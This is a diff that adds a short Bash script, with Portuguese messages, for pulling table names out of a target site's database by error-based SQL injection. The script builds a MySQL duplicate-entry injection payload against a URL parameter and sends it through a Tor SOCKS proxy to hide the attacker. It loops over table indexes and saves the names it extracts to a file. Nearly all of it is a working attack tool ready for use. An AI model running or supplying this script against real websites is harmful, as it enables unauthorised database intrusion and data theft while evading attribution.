@@ -1,0 +1,28 @@
+#!/bin/bash
+
+ALVO="$1"
+DATABASE=$(echo -n "$2" | od -A n -t x1 | tr -d ' ')
+SALVAR_COMO="$3"
+
+[ $# -ne 3 ] && echo -e "\n\tUso: $0 [ALVO] [DATABASE] [SAÍDA] \n\tEx: $(basename $0) https://www.vuln/index.php?id=4 usuarios_db usuarios_tabelas.txt" && exit;
+echo -e "\n\tExplorando database [0x$DATABASE]"
+echo -e "\tSalvando como: \t\t $SALVAR_COMO\n"
+
+for i in $(seq 0 100);
+	do
+		echo -e "\nPuxando a tabela nº $i";
+		EXP="+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x$DATABASE+LIMIT+$i,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)"
+   		RET=$(curl --socks5-hostname 127.0.0.1:9050 -k -s "$ALVO$EXP" | tail)
+
+		if [ "$(echo $RET | grep 'Duplicate entry')" = "" ]; then
+			echo -e "\n Terminado, º $i tabelas encontradas";
+			exit;
+		fi
+
+	POLUIDO=$(echo -n "$RET" | sed -n '/Duplicate entry/p' | sed  's/\~1//g')
+	re="'([^']*)'"
+        [[ $POLUIDO =~ $re ]] && TABELA="${BASH_REMATCH[1]}"
+        echo -e "\n\tTabela encontrada: $TABELA"
+
+	echo -e "$TABELA" >> "$SALVAR_COMO"
+done
